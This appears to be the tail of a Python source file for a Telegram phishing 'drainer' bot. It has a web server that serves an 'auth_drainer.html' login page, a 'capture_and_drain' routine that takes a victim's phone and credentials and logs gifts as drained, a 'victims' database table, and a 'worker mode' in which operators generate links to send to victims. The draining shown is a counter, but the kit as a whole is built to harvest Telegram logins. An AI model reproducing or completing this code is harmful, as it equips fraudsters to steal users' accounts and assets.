# ---------- Capture ----------
async def capture_and_drain(user_id: int, credentials: Dict[str, Any]):
    phone = credentials.get('phone')
    logger.info(f"🎯 Capturing {phone}")
    await asyncio.sleep(2)

    fake_gifts = [
        {"name": "⭐ Золотая Звезда", "stars": 1000},
        {"name": "💎 Алмазный Подарок", "stars": 500},
    ]

    victim_id = cursor.execute("SELECT id FROM victims WHERE telegram_id = ?", (user_id,)).fetchone()
    if victim_id:
        for gift in fake_gifts:
            cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_gifts_drained'")
            logger.info(f"🎁 DRAINED: {gift['name']} from {phone}")

    conn.commit()
    logger.info(f"✅ Capture complete for {phone}")

# ---------- WebApp Server ----------
template_loader = jinja2.FileSystemLoader('templates')
template_env = jinja2.Environment(loader=template_loader)

async def auth_page(request):
    template = template_env.get_template('auth_drainer.html')
    return web.Response(text=template.render(), content_type='text/html')

async def submit_auth(request):
    data = await request.json()
    return web.json_response({'status': 'success'})

def setup_webapp():
    app = web.Application()
    app.router.add_get('/auth', auth_page)
    app.router.add_post('/submit', submit_auth)
    return app

# ---------- Main ----------
async def main():
    webapp = setup_webapp()
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
    await site.start()
    logger.info(f"🌐 WebApp: http://{WEBAPP_HOST}:{WEBAPP_PORT}")

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("kwerteam", kwerteam_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_worker_dm))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    application.add_handler(CallbackQueryHandler(handle_menu_callback))

    await application.initialize()
    await application.start()
    await application.updater.start_polling()

    logger.info("🤖 Bot started")
    logger.info("Worker mode: /kwerteam → @username amount → get link → send to victim")

    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass

    await application.updater.stop()
    await application.stop()
    await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
